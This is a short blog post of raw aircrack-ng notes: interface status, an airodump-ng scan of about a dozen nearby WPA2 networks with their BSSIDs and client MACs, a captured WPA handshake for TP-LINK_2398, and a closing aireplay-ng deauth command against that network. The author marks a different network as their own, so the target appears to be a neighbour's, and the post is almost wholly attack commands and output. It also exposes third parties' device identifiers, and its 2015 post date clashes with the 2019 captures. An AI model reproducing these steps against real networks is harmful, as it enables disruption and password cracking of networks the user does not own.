---
layout: post
title:  "aircrack-home"
date:   2015-06-23 22:19:42 +0300
categories: wifi
tags: wifi
---

# aircrack-home
wlan0     IEEE 802.11abgn  ESSID:"garry-net"  
          Mode:Managed  Frequency:2.472 GHz  Access Point: 64:70:02:A1:CA:5E   
          Bit Rate=130 Mb/s   Tx-Power=15 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality=60/70  Signal level=-50 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:8894  Invalid misc:178   Missed beacon:0



 CH 10 ][ Elapsed: 42 s ][ 2019-06-11 18:24                                         
                                                                                                                                                                                  
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                  
 C0:25:E9:E3:23:98  -72       96        3    0   1  270  WPA2 CCMP   PSK  TP-LINK_2398                                                                                            
 64:70:02:A1:CA:5E  -53       66       15    0  13  130  WPA2 CCMP   PSK  garry-net                                                                                               
 E4:6F:13:C2:E7:F2  -54       56        0    0  13  270  WPA2 CCMP   PSK  Telemir311                                                                                              
 28:28:5D:D5:FF:1E  -73      116        7    0   2  270  WPA2 CCMP   PSK  Keenetic-5773                                                                                           
 C4:6E:1F:8B:AE:4C  -76       44        0    0  13  270  WPA2 CCMP   PSK  Telemir-291                                                                                             
 AC:84:C6:1C:45:0B  -74      123        0    0   5  405  WPA2 CCMP   PSK  TP-Link_450B                                                                                            
 D4:60:E3:E1:DE:CE  -82       69        1    0   8  270  WPA2 CCMP   PSK  Beeline_2G_FFF51F                                                                                       
 78:96:82:23:8F:D8  -83       42        0    0   9  270  WPA2 CCMP   PSK  WiFi-DOM.ru-4368                                                                                        
 98:DE:D0:35:8D:AA  -88       27        0    0   9  270  WPA2 CCMP   PSK  telemir 8                                                                                               
 C0:25:E9:B1:BB:C4  -88       15        0    0   4  270  WPA2 CCMP   PSK  Telemir-37                                                                                              
 14:D6:4D:38:07:AA  -89        2        0    0   2  130  WPA2 CCMP   PSK  gercon                                                                                                  
 90:EF:68:FB:56:28  -90        2        0    0   1  270  WPA2 CCMP   PSK  Electroma                                                                                               
                                                                                                                                                                                  
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                         
                                                                                                                                                                                   
 (not associated)   DA:A1:19:93:A8:12  -52    0 - 1      0       12                                                                                                                
 (not associated)   DA:A1:19:A3:A5:5C  -55    0 - 1     19        9                                                                                                                
 (not associated)   DA:A1:19:C7:A0:DA  -57    0 - 1      0       17                                                                                                                
 (not associated)   DA:A1:19:17:B5:56  -77    0 - 1      0       10                                                                                                                
 (not associated)   B4:E6:2A:AC:32:C8  -83    0 - 1      0       11                                                                                                                
 C0:25:E9:E3:23:98  F4:71:90:77:9F:20  -70    0 - 1      0        1                                                                                                                
 C0:25:E9:E3:23:98  7C:46:85:59:15:83  -73    0e- 6      0        4                                                                                                                
 64:70:02:A1:CA:5E  F4:60:E2:A5:03:C4  -57    0e- 1e     0        5    (мой телефон и роутер) 

---------------------------------------
airodump-ng wlan0mon

 CH  1 ][ Elapsed: 42 s ][ 2019-06-11 18:33 ][ WPA handshake: C0:25:E9:E3:23:98                                         
                                                                                                                                                                                  
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                  
 C0:25:E9:E3:23:98  -56   0      434    13588    2   1  270  WPA2 CCMP   PSK  TP-LINK_2398                                                                                        
                                                                                                                                                                                  
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                        
                                                                                                                                                                                  
 C0:25:E9:E3:23:98  F4:71:90:77:9F:20  -70    0e- 1      0      191                                                                                                                
 C0:25:E9:E3:23:98  7C:46:85:59:15:83  -77    0e- 6      1    13398  TP-LINK_2398                                                                                                  
 C0:25:E9:E3:23:98  AC:A2:13:4F:90:98  -83    1e- 1e     0       38 


aireplay-ng –deauth 1 -a C0:25:E9:E3:23:98 wlan0mon
-----------------------------------------

